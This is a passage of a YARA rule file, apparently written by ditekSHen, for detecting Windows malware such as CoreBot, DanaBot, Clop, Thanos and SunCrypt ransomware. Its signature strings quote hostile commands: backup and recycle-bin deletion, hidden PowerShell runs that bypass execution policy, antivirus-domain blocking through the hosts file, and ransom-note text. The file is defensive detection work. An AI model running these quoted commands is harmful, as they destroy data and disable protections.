((uint16(0) == 0x5a4d and filesize < 4000KB) and (1 of ($x*) or 6 of ($s*) or all of ($cnc*) or (4 of ($s*) and 2 of ($cnc*)))) or (1 of ($x*) or 6 of ($s*) or all of ($cnc*) or (4 of ($s*) and 2 of ($cnc*)))
}
rule SSC_Win_QuilClipper {
meta:
author = "ditekSHen"
description = "Detects QuilClipper variants mostly in memory or extracted AutoIt script"
strings:
$cnc1 = "QUILCLIPPER by" ascii
$cnc2 = "/ UserName:" ascii
$cnc3 = "/ System:" ascii
$s1 = "DLLCALL ( \"kernel32.dll\" , \"handle\" , \"CreateMutexW\" , \"struct*\"" ascii
$s2 = "SHELLEXECUTE ( @SCRIPTFULLPATH , \"\" , \"\" , FUNC_" ascii
$s3 = "CASE BITROTATE" ascii
$s4 = "CASE BITXOR" ascii
$s5 = "CLIP( FUNC_" ascii
$s6 = "CLIPPUT (" ascii
$s7 = "FUNC _CLIPPUTFILE(" ascii
$s8 = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Schedule" ascii
condition:
all of ($cnc*) or all of ($s*)
}
rule SSC_Win_Renamer {
meta:
author = "ditekSHen"
description = "Detects Renamer/Tainp variants"
strings:
$s1 = "shell\\open\\command=" fullword wide
$s2 = "icon=%SystemRoot%\\system32\\SHELL32.dll,4" fullword wide
$s3 = "DropTarget" ascii
$s4 = "C:\\Windows\\Paint" fullword wide
$s5 = "hold.inf" fullword wide
$s6 = "Dropped" ascii
condition:
uint16(0) == 0x5a4d and all of ($s*) or
(
4 of ($s*) and
for any directory in pe.data_directories :
(
directory.virtual_address != 0 and
directory.size == 0
)
)
}
rule SSC_Win_Epsilon {
meta:
author = "ditekSHen"
description = "Detects Epsilon ransomware"
strings:
$s1 = ".Speak \"" wide
$s2 = "chkUpdateRegistry" fullword wide
$s3 = "/C choice /C Y /N /D Y /T 1 & Del \"" fullword wide
$s4 = "CreateObject(\"sapi.spvoice\")" fullword wide
$s5 = "READ_ME.hta" wide
$s6 = "WScript.Sleep(" wide
$s7 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" fullword wide
$s8 = "<div class='bold'>Files are encrypted* but not deleted.</div>" ascii
$e1 = { 72 00 75 00 6e 00 64 00 6c 00 6c 00 2e 00 65 00
78 00 65 00 00 09 2e 00 74 00 78 00 74 00 00 09
2e 00 64 00 6f 00 63 00 00 0b 2e 00 64 00 6f 00
63 00 78 00 00 09 2e 00 78 00 6c 00 73 00 00 0d
2e 00 69 00 6e 00 64 00 65 00 78 00 00 09 2e 00
70 00 64 00 66 00 00 09 2e 00 7a 00 69 00 70 00
00 09 2e 00 72 00 61 00 72 00 00 09 2e 00 63 00
73 00 73 00 00 09 2e 00 6c 00 6e 00 6b 00 00 0b
2e 00 78 00 6c 00 73 00 78 00 00 09 2e 00 70 00
70 00 74 00 00 0b 2e 00 70 00 70 00 74 00 78 00
00 09 2e 00 6f 00 64 00 }
$e2 = { 68 00 74 00 6d 00 00 07 2e 00 6d 00 6c 00 00 07
43 00 3a 00 5c 00 00 07 44 00 3a 00 5c 00 00 07
45 00 3a 00 5c 00 00 07 46 00 3a 00 5c 00 00 07
47 00 3a 00 5c 00 00 07 5a 00 3a 00 5c 00 00 07
41 00 3a 00 5c 00 00 0f 63 00 6d 00 64 00 2e 00
65 00 78 00 65 }
condition:
uint16(0) == 0x5a4d and (6 of ($s*) or (all of ($e*) and 4 of ($s*)))
}
rule SSC_Win_CoreBot {
meta:
author = "ditekSHen"
description = "Detects CoreBot"
snort_sid = "920211-920212"
strings:
$f1 = "core.cert_fp" fullword ascii
$f2 = "core.crash_handler" fullword ascii
$f3 = "core.delay" fullword ascii
$f4 = "core.guid" fullword ascii
$f5 = "core.inject" fullword ascii
$f6 = "core.installed_file" fullword ascii
$f7 = "core.plugins_dir" fullword ascii
$f8 = "core.plugins_key" fullword ascii
$f9 = "core.safe_mode" fullword ascii
$f10 = "core.server" fullword ascii
$f11 = "core.servers" fullword ascii
$f12 = "core.test_env" fullword ascii
$f13 = "core.vm_detect" fullword ascii
$f14 = "core.vm_detect_skip" fullword ascii
$s1 = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" fullword wide
$s2 = "\\Microsoft\\Windows\\AppCache" wide
$s3 = "crash_flag" fullword wide
$s4 = "container.dat" fullword wide
$s5 = "INJECTED" fullword ascii
$s6 = "tmp.delete_file" fullword ascii
// variant
$x1 = "CoreBot v" wide
$x2 = "BotName" fullword ascii
$x3 = "RunBotKiller" fullword ascii
$x4 = "botv" fullword ascii
$x5 = "\\CoreBot\\CoreBot\\obj\\" ascii
$v1_1 = "newtask" fullword wide
$v1_2 = "drivers\\etc\\hosts" fullword wide
$v1_3 = "/C schtasks /create /tn \\" wide
$v1_4 = "/st 00:00 /du 9999:59 /sc once /ri 1 /f" wide
$v1_5 = "AntivirusInstalled" fullword ascii
$v1_6 = "payload" fullword ascii
$v1_7 = "DownloadFile" fullword ascii
$v1_8 = "RemoveFile" fullword ascii
$v1_9 = "AutoRunName" fullword ascii
$v1_10 = "EditHosts" fullword ascii
$v1_11 = /127\.0\.0\.1 (avast|mcafee|eset|avira|bitdefender|bullguard|safebrowse)\.com/ fullword wide
$cnc1 = "&os=" fullword wide
$cnc2 = "&pv=" fullword wide
$cnc3 = "&ip=" fullword wide
$cnc4 = "&cn=" fullword wide
$cnc5 = "&lr=" fullword wide
$cnc6 = "&ct=" fullword wide
$cnc7 = "&bv=" fullword wide
$cnc8 = "&op=" fullword wide
$cnc9 = "&td=" fullword wide
$cnc10 = "&uni=" fullword wide
condition:
uint16(0) == 0x5a4d and (5 of ($f*) or all of ($s*) or (3 of ($s*) and 2 of ($f*)) or 3 of ($x*) or 8 of ($v1*) or (4 of ($cnc*) and 4 of ($v1*)) or 12 of them)
}
rule SSC_Win_DLLLoader {
meta:
author = "ditekSHen"
description = "Detects unknown DLL Loader"
strings:
$s1 = "LondLibruryA" fullword ascii
$s2 = "LdrLoadDll" fullword ascii
$s3 = "snxhk.dll" fullword ascii
$s4 = "DisableThreadLibraryCalls" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Farfli {
meta:
author = "ditekSHen"
description = "Detects Farfli backdoor"
strings:
$s1 = "%ProgramFiles%\\Google\\" fullword ascii
$s2 = "%s\\%d.bak" fullword ascii
$s3 = "%s Win7" fullword ascii
$s4 = "%s:%d:%s" fullword ascii
$s5 = "C:\\2.txt" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Warezov {
meta:
author = "ditekSHen"
description = "Detects Warezov worm/downloader"
strings:
$s1 = "ft\\Windows\\CurrentVersion\\Run" wide
$s2 = "DIR%SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide
$s3 = "%WINDIR%\\sqhos32.wmf" wide
$s4 = "Accept: */*" fullword ascii
$s5 = "Range: bytes=" fullword ascii
$s6 = "module.exe" fullword ascii
$s7 = { 25 73 25 73 2e 25 73 ?? ?? 22 22 26 6c 79 79 56 00 00 00 00 25 73 25 30 34 64 25 30 32 64 25 30 32 64 00 }
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_Arechclient2 {
meta:
author = "ditekSHen"
description = "Detects Arechclient2 RAT"
strings:
$s1 = "\\Google\\Chrome\\User Data\\copiedProf\"" wide
$s2 = "\",\"BotName\":\"" wide
$s3 = "\",\"BotOS\":\"" wide
$s4 = "\",\"URLData\":\"" wide
$s5 = "{\"Type\":\"ConnectionType\",\"ConnectionType\":\"Client\",\"SessionID\":\"" wide
$s6 = "{\"Type\":\"TestURLDump\",\"SessionID\":\"" wide
$s7 = "<ReceiveParticipantList>" ascii
$s8 = "<potocSkr>" ascii
$s9 = "fuck_sd" fullword ascii
$s10 = "HandleBotKiller" fullword ascii
$s11 = "RunBotKiller" fullword ascii
$s12 = "ConnectToServer" fullword ascii
$s13 = "KillBrowsers" fullword ascii
$s14 = "keybd_event" fullword ascii
$s15 = "FuckCodeImg" fullword ascii
$v1_1 = "grabber@" fullword ascii
$v1_2 = "<BrowserProfile>k__" ascii
$v1_3 = "<SystemHardwares>k__" ascii
$v1_4 = "<geoplugin_request>k__" ascii
$v1_5 = "<ScannedWallets>k__" ascii
$v1_6 = "<DicrFiles>k__" ascii
$v1_7 = "<MessageClientFiles>k__" ascii
$v1_8 = /<Scan(Browsers|Wallets|Screen|VPN)>k__BackingField/ fullword ascii
$v1_9 = "displayName[AString-ZaString-z\\d]{2String4}\\.[String\\w-]{String6}\\.[\\wString-]{2String7}Local Extension Settingshost" wide
$v1_10 = "\\sitemanager.xml MB or SELECT * FROM Cookiesconfig" wide
condition:
uint16(0) == 0x5a4d and (6 of ($s*) or 7 of ($v1*) or (6 of ($v1*) and 1 of ($s*)))
}
rule SSC_Win_KillMBR {
meta:
author = "ditekSHen"
description = "Detects KillMBR"
strings:
$s1 = "\\\\.\\PhysicalDrive" ascii
$s2 = "/logger.php" ascii
$s3 = "Ooops! Your MBR was been rewritten" ascii
$s4 = "No, this ransomware dont encrypt your files, erases it" ascii
condition:
uint16(0) == 0x5a4d and (2 of them and #s1 > 10)
}
rule SSC_Win_LCPDot {
meta:
author = "ditekSHen"
description = "Detects LCPDot"
strings:
$s1 = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword wide
$s2 = "Cookie: SESSID=%s" fullword ascii
$s3 = "Cookie=Enable" fullword ascii
$s4 = "Cookie=Enable&CookieV=%d&Cookie_Time=32" fullword ascii
$s5 = ".?AVTShellCodeRuner@@" fullword ascii
$s6 = ".?AVTHashEncDecoder@@" fullword ascii
$s7 = ".?AVTWebAddressList@@" fullword ascii
$s8 = "WinMain.dll" fullword ascii
$s9 = "HotPlugin" wide
$o0 = { 4c 89 6c 24 08 4c 89 34 24 44 8d 77 01 44 8d 6f }
$o1 = { 8b f0 e8 58 34 00 00 48 8b f8 48 85 c0 74 0c 48 }
$o2 = { c7 44 24 30 47 49 46 38 c7 44 24 34 39 61 27 00 }
condition:
uint16(0) == 0x5a4d and 6 of ($s*) or (all of ($o*) and 3 of ($s*))
}
rule SSC_Win_Torisma {
meta:
author = "ditekSHen"
description = "Detects Torisma"
strings:
$s1 = "ACTION=PREVPAGE&CODE=C%s&RES=%d" fullword ascii
$s2 = "ACTION=VIEW&PAGE=%s&CODE=%s&CACHE=%s&REQUEST=%d" fullword ascii
$s3 = "ACTION=NEXTPAGE&CODE=S%s&CACHE=%s&RES=%d" fullword ascii
$s4 = "Your request has been accepted. ClientID: {" ascii
$s5 = "Proxy-Connection: Keep-Alive" fullword wide
$s6 = "Content-Length: %d" fullword wide
$o0 = { f7 f9 8b c2 89 44 24 34 48 63 44 24 34 48 8b 4c }
$o1 = { 48 c7 00 ff ff ff ff 48 8b 84 24 90 }
$o2 = { f3 aa 83 7c 24 30 01 75 34 c7 44 24 20 01 }
condition:
uint16(0) == 0x5a4d and 4 of ($s*) or (all of ($o*) and 3 of ($s*))
}
rule SSC_Win_Thanos {
meta:
author = "ditekSHen"
description = "Detects Thanos / Prometheus / Spook ransomware"
strings:
$f1 = "<WorkerCrypter2>b__" ascii
$f2 = "<Encrypt2>b__" ascii
$f3 = "<Killproc>b__" ascii
$f4 = "<GetIPInfo>b__" ascii
$f5 = "<MacAddress>k__" ascii
$f6 = "<IPAddress>k__" ascii
$f7 = "<Crypt>b__" ascii
$s1 = "Aditional KeyId:" wide
$s2 = "process call create cmd.exe /c \\\\" wide
$s3 = "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin" wide
$s4 = "\\HOW_TO_DECYPHER_FILES." wide
$s5 = "Client Unique Identifier Key:" wide
$s6 = "/s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk" fullword wide
$s7 = "NtOpenProcess" fullword wide
$s8 = "Builder_Log" fullword wide
$s9 = "> Nul & fsutil file setZeroData offset=0 length=" wide
$s10 = "3747bdbf-0ef0-42d8-9234-70d68801f407" wide // mutex
$s11 = "4b195894-0f06-4fdd-afb4-b17fb9246a59" wide
$s12 = "cec564ff-2433-4771-b918-15f58ef6e26c" wide
$s13 = "56258a19-7489-468b-86ee-e7899203d67c" wide
$s14 = "WalkDirectoryTree" fullword ascii
$s15 = "hashtableLock" fullword ascii
$s16 = "get_ParentFrn" fullword ascii
$m1 = "SW5mb3JtYXRpb24uLi" wide
$m2 = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0" wide
condition:
uint16(0) == 0x5a4d and (5 of ($f*) or 5 of ($s*) or (4 of ($f*) and 2 of ($s*) or (all of ($m*) and 3 of them)) or 8 of them)
}
rule SSC_Win_TManager {
meta:
author = "ditekSHen"
description = "Detects TManager RAT. Associated with TA428"
strings:
$s1 = "WSAStartup Error!" fullword wide
$s2 = "KB3112342.LOG" fullword wide
$s3 = "\\cmd.exe -c" fullword wide
$s4 = "sock_hmutex" fullword wide
$s5 = "cmd_hmutex" fullword wide
$s6 = "powershell" fullword wide
$s7 = "%s_%d.bmp" fullword wide
$s8 = "!Error!" fullword wide
$s9 = "[Execute]" fullword ascii
$s10 = "[Snapshot]" fullword ascii
$s11 = "GetLanIP error!" fullword ascii
$s12 = "chcp & exit" fullword ascii
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_Sn0wLogger {
meta:
author = "ditekSHen"
description = "Detects Sn0w Logger"
strings:
$s1 = "\\SnowP\\Example\\Secured\\" ascii
$s2 = "{0}{3}Content-Type: {4}{3}Content-Disposition: form-data; name=\"{1}\"{3}{3}{2}{3}" wide
$s3 = "\"encrypted_key\":\"(.*?)\"" fullword wide
$s4 = "<SendToDiscord>d__" ascii
$s5 = "_urlWebhook" ascii
$r1 = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}" fullword wide
$r2 = "^\\w+([-+.']\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$" fullword wide
$r3 = "mfa\\.[\\w-]{84}" fullword wide
$r4 = "(\\w+)=(\\d+)-(\\d+)$" fullword wide
condition:
uint16(0) == 0x5a4d and (4 of ($s*) or (all of ($r*) and 2 of ($s*)) or 7 of them)
}
rule SSC_Win_DanaBot {
meta:
author = "ditekSHen"
description = "Detects DanaBot variants"
strings:
$s1 = "ms ie ftp passwords" fullword wide
$s2 = "CookieEntryEx_" fullword wide
$s3 = "winmgmts:\\\\localhost\\root\\cimv2" fullword wide
$s4 = "S-Password.txt" fullword wide
$s5 = "del_ini://Main|Password|" fullword wide
$s6 = "cmd.exe /c start chrome.exe --no-sandbox" wide
$s7 = "cmd.exe /c start firefox.exe -no-remote" wide
$s8 = "\\rundll32.exe shell32.dll,#" wide
$s9 = "S_Error:TORConnect" wide
$s10 = "InjectionProcess" fullword ascii
$s11 = "proxylogin" fullword wide
$s12 = "\\FS_Morff\\FS_Temp\\" wide
$ds1 = "C:\\Windows\\System32\\rundll32.exe" fullword wide
$ds2 = "PExtended4" fullword ascii
$ds3 = "%s-%s" fullword wide
$ds4 = "00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D5E5F606162636465666768696A6B6C6D6E6F707172737475767778797A7B7C7D7E7F808182838485868788898A8B8C8D8E8F909192939495969798999A9B9C9D9E9FA0A1A2A3A4A5A6A7A8A9AAABACADAEAFB0B1B2B3B4B5B6B7B8B9BABBBCBDBEBFC0C1C2C3C4C5C6C7C8C9CACBCCCDCECFD0D1D2D3D4D5D6D7D8D9DADBDCDDDEDFE0E1E2E3E4E5E6E7E8E9EAEBECEDEEEFF0F1F2F3F4F5F6F7F8F9FAFBFCFDFEFF0123456789ABCDEF" fullword wide
//$o1 = { 55 8b ec 33 c0 55 68 d7 60 4f 00 64 ff 30 64 89 }
//$o2 = { e8 45 ec f0 ff e8 3c e2 f0 ff 68 00 04 00 00 e8 }
//$o3 = { e8 98 3a f2 ff 84 c0 74 0a 8d 44 24 0c 50 e8 fe }
//$o4 = { ba 80 d7 4f 00 a1 54 90 4f 00 e8 7e 4a f1 ff e9 }
//$o5 = { 80 bc 24 4a 01 00 00 01 75 14 ba 80 d7 4f 00 a1 }
//$o6 = { ba 80 d7 4f 00 a1 80 8f 4f 00 e8 4c 4a f1 ff e9 }
condition:
uint16(0) == 0x5a4d and (7 of ($s*) or all of ($ds*))
}
rule SSC_Win_Klackring {
meta:
author = "ditekSHen"
description = "Detects Klackring variants. Associated with ZINC / Lazarus"
strings:
$s1 = "%s\\%s.dll" fullword wide
$s2 = "cmd.exe /c move /Y %s %s" fullword wide
$s3 = "%s\\win32k.sys" fullword wide
$s4 = "NetSvcInst_Rundll32.dll" fullword ascii
$s5 = "Spectrum.dll" fullword ascii wide
$s6 = "%s\\cmd.exe" fullword wide
$s7 = ".?AVA5Stream@@" fullword ascii
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_ComeBacker {
meta:
author = "ditekSHen"
description = "Detects ComeBacker variants. Associated with ZINC / Lazarus"
strings:
$s1 = "ENGINE_get_RAND" ascii
$s2 = "./{IES" fullword ascii
$s3 = "TODO: <Company name>" fullword wide
$s4 = "@Microsoft Corperation. All rights reserved." fullword wide
$s5 = "Microsoft@Windows@Operating System" fullword wide
$x1 = "C:\\Windows\\System32\\rundll32.exe %s,%s %s %s" fullword ascii wide
$x2 = "ASN2_TYPE_new" fullword ascii wide
$x3 = "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\" fullword ascii wide
condition:
uint16(0) == 0x5a4d and (all of ($s*) or all of ($x*))
}
rule SSC_Win_SunCrypt {
meta:
author = "ditekSHen"
description = "Detects SunCrypt ransomware"
strings:
$s1 = "-noshares" fullword wide
$s2 = "-nomutex" fullword wide
$s3 = "-noreport" fullword wide
$s4 = "-noservices" fullword wide
$s5 = "$Recycle.bin" fullword wide
$s6 = "YOUR_FILES_ARE_ENCRYPTED.HTML" fullword wide
$s7 = "\\\\?\\%c:" fullword wide
$s8 = "locker.exe" fullword ascii
$s9 = "DllRegisterServer" fullword ascii
$g1 = "main.EncFile" fullword ascii nocase
$g2 = "main.detectName" fullword ascii nocase
$g3 = "main.detectIP" fullword ascii nocase
$g4 = "main.detectDebugProc" fullword ascii nocase
$g5 = "main.Bypass" ascii nocase
$g6 = "main.allocateMemory" fullword ascii nocase
$g7 = "main.killAV" fullword ascii nocase
$g8 = "main.disableShadowCopy" fullword ascii nocase
$g9 = "main.(*windowsDrivesModel).LoadDrives" fullword ascii nocase
$g10 = "main.IsFriends" fullword ascii nocase
$g11 = "main.walkMsg" fullword ascii nocase
$g12 = "main.makeSecretMessage" fullword ascii nocase
$g13 = "main.stealFiles" fullword ascii nocase
$g14 = "main.newKey" fullword ascii nocase
$g15 = "main.openBrowser" fullword ascii nocase
$g16 = "main.killProc" fullword ascii nocase
$g17 = "main.selfRemove" fullword ascii nocase
$m1 = "<h2>\\x20Offline\\x20HowTo\\x20</h2>\\x0a\\x09\\x09\\x09\\x09<p>Copy\\x20&\\x20Paste\\x20this\\x20message\\x20to" ascii
$m2 = "\\x20restore\\x20your\\x20files." ascii
$m3 = "\\x20your\\x20documents\\x20and\\x20files\\x20encrypted" ascii
$m4 = "\\x20lose\\x20all\\x20of\\x20your\\x20data\\x20and\\x20files." ascii
$m5 = ",'/#/client/','<h2>\\x20Whats\\x20Happen" ascii
condition:
uint16(0) == 0x5a4d and (5 of ($s*) or 6 of ($g*) or 3 of ($m*))
}
rule SSC_Win_GENERIC01 {
meta:
author = "ditekSHen"
description = "Detects known unamed malicious executables, mostly DLLs"
strings:
$s1 = "\\wmkawe_%d.data" ascii
$s2 = "\\resmon.resmoncfg" ascii
$s3 = "ByPassUAC" fullword ascii
$s4 = "rundll32.exe C:\\ProgramData\\Sandboxie\\SbieMsg.dll,installsvc" fullword ascii nocase
$s5 = "%s\\SbieMsg." ascii
$s6 = "Stupid Japanese" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_GENERIC02 {
meta:
author = "ditekSHen"
description = "Detects known unamed malicious executables"
strings:
$s1 = "{%s-%d-%d}" fullword wide
$s2 = "update" fullword wide
$s3 = "https://" fullword wide
$s4 = "http://" fullword wide
$s5 = "configure" fullword ascii
$s6 = { 8d 4f 02 e8 8c ff ff ff 8b d8 81 fb 00 dc 00 00 }
$s7 = { 83 c1 02 e8 3c ff ff ff 8b c8 ba ff 03 00 00 8d }
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_EXEPWSH_DLAgent {
meta:
author = "ditekSHen"
description = "Detects SystemBC"
strings:
$pwsh = "powershell" fullword ascii
$bitstansfer = "Start-BitsTransfer" ascii wide
$s1 = "GET %s HTTP/1" ascii
$s2 = "User-Agent:" ascii
$s3 = "-WindowStyle Hidden -ep bypass -file \"" fullword ascii
$s4 = "LdrLoadDll" fullword ascii
$v1 = "BEGINDATA" fullword ascii
$v2 = /HOST\d:/ ascii
$v3 = /PORT\d:/ ascii
$v4 = "TOR:" fullword ascii
$v5 = "Fwow64" fullword ascii
$v6 = "start" fullword ascii
condition:
uint16(0) == 0x5a4d and (($pwsh and ($bitstansfer or 2 of ($s*))) or (5 of ($v*)))
}
rule SSC_Win_CryptoLocker {
meta:
author = "ditekSHen"
description = "Detects Cryptolocker ransomware variants (Betarasite)"
strings:
$x1 = "CryptoLocker" fullword wide
$x2 = ".betarasite" fullword wide
$x3 = "CMSTPBypass" fullword ascii
$s1 = "CommandToExecute" fullword ascii
$s2 = "SetInfFile" fullword ascii
$s3 = "SchoolPrject1" ascii
$s4 = "$730d5f64-bd57-47c1-9af4-d20aec714d02" fullword ascii
$s5 = "Encrypt" fullword ascii
$s6 = "Invalide Key! Please Try Again." fullword wide
$s7 = "RegAsm" fullword wide
$s8 = "Your key will be destroyed" wide
$s9 = "encrypted using RC4 and RSA-2048" wide
$c1 = "https://coinbase.com" fullword wide
$c2 = "https://localbictoins.com" fullword wide
$c3 = "https://bitpanda.com" fullword wide
condition:
uint16(0) == 0x5a4d and (all of ($x*) or all of ($s*) or (2 of ($x*) and 5 of ($s*)) or (all of ($c*) and 1 of ($x*) and 2 of ($s*)))
}
rule SSC_Win_PWSH_PoshWiFiStealer {
meta:
author = "ditekSHen"
description = "Detects PowerShell PoshWiFiStealer"
strings:
$s1 = "netsh wlan export profile" ascii
$s2 = "Send-MailMessage" ascii
$u1 = "https://github.com/axel05869/Wifi-Grab" ascii
$u2 = "/exploitechx/wifi-password-extractor" ascii
condition:
all of ($s*) or all of ($u*)
}
rule SSC_Win_SteamHook {
meta:
author = "ditekSHen"
description = "Detects potential Steam stealer"
strings:
$s1 = "Mozilla/4.0 (compatible; )" fullword ascii
$s2 = "/steam/upload.php" ascii
$s3 = ".*?(ssfn\\d+)" fullword ascii
$s4 = "add cookie failed..." fullword ascii
$s5 = "Content-Type: multipart/form-data; boundary=--MULTI-PARTS-FORM-DATA-BOUNDARY" fullword ascii
$pdb1 = "\\SteamHook\\Install\\" ascii
$pdb2 = "\\SteamHook\\dll\\" ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or all of ($pdb*) or (1 of ($pdb*) and 3 of ($s*)))
}
rule SSC_Win_NetWire {
meta:
author = "ditekSHen"
description = "Detects NetWire RAT"
strings:
$x1 = "SOFTWARE\\NetWire" fullword ascii
$x2 = { 4e 65 74 57 69 72 65 00 53 4f 46 54 57 41 52 45 5c 00 }
$s1 = "User-Agent: Mozilla/4.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword ascii
$s2 = "filenames.txt" fullword ascii
$s3 = "GET %s HTTP/1.1" fullword ascii
$s4 = "[%.2d/%.2d/%d %.2d:%.2d:%.2d]" fullword ascii
$s5 = "Host.exe" fullword ascii
$s6 = "-m \"%s\"" fullword ascii
$g1 = "HostId" fullword ascii
$g2 = "History" fullword ascii
$g3 = "encrypted_key" fullword ascii
$g4 = "Install Date" fullword ascii
$g5 = "hostname" fullword ascii
$g6 = "encryptedUsername" fullword ascii
$g7 = "encryptedPassword" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or all of ($x*) or (1 of ($x*) and 2 of ($s*)) or (all of ($g*) and (2 of ($s*) or 1 of ($x*))))
}
rule SSC_Win_BreakStaf {
meta:
author = "ditekSHen"
description = "Detects BreakStaf ransomware"
strings:
$s1 = "C:\\Program files" wide
$s2 = "C:\\Program files (x86)" wide
$s3 = "C:\\System Volume Information" wide
$s4 = "C:\\$Recycle.Bin" wide
$s5 = "C:\\Windows" wide
$s6 = ".?AVRandomNumberGenerator@Crypto" ascii
$s7 = ".?AV?$SymmetricCipherFinal@" ascii
$s8 = ".breakstaf" fullword wide nocase
$s9 = "readme.txt" fullword wide nocase
$s10 = ".VHD" fullword wide nocase
$s11 = ".vhdx" fullword wide nocase
$s12 = ".BAK" fullword wide nocase
$s13 = ".BAC" fullword wide nocase
condition:
uint16(0) == 0x5a4d and 12 of them
}
rule SSC_Win_Kitty {
meta:
author = "ditekSHen"
description = "Detects HelloKitty ransomware, triggers on FIVEHANDS"
strings:
$s1 = "Kitty" wide
$s2 = "-path" fullword wide
$s3 = "select * from Win32_ShadowCopy" fullword wide
$s4 = "Win32_ShadowCopy.ID='%s'" fullword wide
$s5 = "programdata" fullword wide
$s6 = "$recycle.bin" fullword wide
$s7 = ".crypt" fullword wide
$s8 = "%s/secret/%S" wide
$s9 = "decrypts3nln3tic.onion" wide
$n1 = "read_me_lkd.txt" wide
$n2 = "DECRYPT_NOTE.txt" wide
condition:
uint16(0) == 0x5a4d and (5 of ($s*) or 1 of ($n*) and 4 of ($s*))
}
rule SSC_Win_DLAgent07 {
meta:
author = "ditekSHen"
description = "Detects delf downloader agent"
strings:
$s1 = "C:\\Users\\Public\\Libraries\\temp" fullword ascii
$s2 = "SOFTWARE\\Borland\\Delphi" ascii
$s3 = "Mozilla/5.0(compatible; WinInet)" fullword ascii
$o1 = { f3 a5 e9 6b ff ff ff 5a 5d 5f 5e 5b c3 a3 00 40 }
$o2 = { e8 83 d5 ff ff 8b 15 34 40 41 00 89 10 89 58 04 }
$o3 = { c3 8b c0 53 51 e8 f1 ff ff ff 8b d8 85 db 74 3e }
$o4 = { e8 5c e2 ff ff 8b c3 e8 b9 ff ff ff 89 04 24 83 }
$o5 = { 85 c0 74 1f e8 62 ff ff ff a3 98 40 41 00 e8 98 }
$o6 = { 85 c0 74 19 e8 be ff ff ff 83 3d 98 40 41 00 ff }
$x1 = "22:40:08        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\"" ascii
$x2 = "uuid:A9BD8E384B2FDE118D26E6EE744C235C\" stRef:documentID=\"uuid:A8BD8E384B2FDE118D26E6EE744C235C\"/>" ascii
condition:
uint16(0) == 0x5a4d and ((2 of ($s*) and 5 of ($o*)) or (all of ($s*) and 2 of ($o*)) or (all of ($x*) and 2 of them))
}
rule SSC_Win_Clop {
meta:
author = "ditekSHen"
description = "Detects Clop ransomware variants"
strings:
$x1 = "Cllp^_-" ascii
$s2 = "temp.dat" fullword wide
$s3 = "README_README.txt" wide
$s4 = "BEGIN PUBLIC KEY" ascii
$s5 = "runrun" wide
$s6 = "wevtutil.exe" ascii
$s7 = "%s%s.Cllp" fullword wide
$s8 = "WinCheckDRVs" fullword wide
$o1 = { 6a ff 56 89 9d 28 dd ff ff ff d0 a1 64 32 41 00 }
$o2 = { 56 89 9d 28 dd ff ff ff 15 78 32 41 00 eb 07 43 }
$o3 = { 68 ?? 34 41 00 8d 85 58 dd ff ff 50 ff d7 85 c0 }
$o4 = { 68 d0 34 41 00 50 ff d6 8b bd 28 d5 ff ff 83 c4 }
$o5 = { a1 64 32 41 00 43 56 89 9d 08 d5 ff ff ff d0 8b }
condition:
uint16(0) == 0x5a4d and (all of ($s*) or (1 of ($x*) and (3 of ($s*) or 4 of ($o*))) or (all of ($o*) and 2 of ($s*)) or (4 of ($s*) and 4 of ($o*)))
}
rule SSC_Win_Maktub {
meta:
author = "ditekSHen"
description = "Detects Maktub ransomware"
strings:
$s1 = "Content-Disposition: attachment; filename=" ascii
$s2 = "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" fullword ascii
$s3 = "/tor/status-vote/current/consensus" ascii
$s4 = "/tor/server/fp/" ascii
$s5 = "/tor/rendezvous2/" ascii
$s6 = "404 Not found" fullword ascii
$s7 = /_request@\d+/ fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_PWSHLoader_RunPE01 {
meta:
author = "ditekSHen"
description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
strings:
$rp1 = "GetType('RunPe.RunPe'" ascii
$rp2 = "GetType(\"RunPe.RunPe\"" ascii
$rm1 = "GetMethod('Run'" ascii
$rm2 = "GetMethod(\"Run\"" ascii
$s1 = ".Invoke(" ascii
$s2 = "[Reflection.Assembly]::Load(" ascii
condition:
all of ($s*) and 1 of ($rp*) and 1 of ($rm*)
}
rule SSC_Win_PWSHLoader_RunPE02 {
meta:
author = "ditekSHen"
description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
strings:
$s1 = "'.Replace('" ascii nocase
$s2 = "'aspnet_compiler.exe'" ascii
$s3 = "[Byte[]]$" ascii
